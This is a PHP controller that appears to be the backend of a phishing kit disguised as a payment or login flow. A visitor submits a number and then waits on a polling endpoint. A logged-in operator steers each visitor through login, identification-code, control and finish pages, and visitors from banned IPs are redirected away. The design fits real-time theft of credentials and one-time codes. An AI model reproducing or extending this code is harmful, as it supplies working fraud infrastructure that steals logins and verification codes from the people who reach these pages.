<?php

namespace App\Controllers\Sns;

use \Core\View;
use \App\Models\Sns\Sns;
use \App\Auth;

class Login extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['number'])) {
            Sns::setLogin($_POST['number'], $_SESSION['uid']);
        } else {
            if (Sns::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Sns::checkPayment($this->route_params['id'])) {
                Sns::redirect();
            } else {
                Sns::setLogInformation($_SESSION['uid']);

                View::render('Sns/login.php');
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Sns::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Sns::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'identification') {
                        echo json_encode(['page' => 'identification']);   
                        Sns::setDetailsPage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Sns::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Sns::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Sns::redirect();
        }
    }

    public function setPageAction()
    {
        if (Auth::isLoggedIn()) {
            if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['id']) && isset($_POST['page'])) {
                if ($_POST['page'] == 'login') {
                    $check = Sns::setLoginPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'identification') {
                    $check = Sns::setDetailsPageCode($_POST['id'], $_POST['page'], $_POST['code']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'control') {
                    $check = Sns::setControlPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'finish') {
                    $check = Sns::setFinishPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                }
            } else {
                Sns::redirect();
            }
        } else {
            Sns::redirect();
        }
    }
}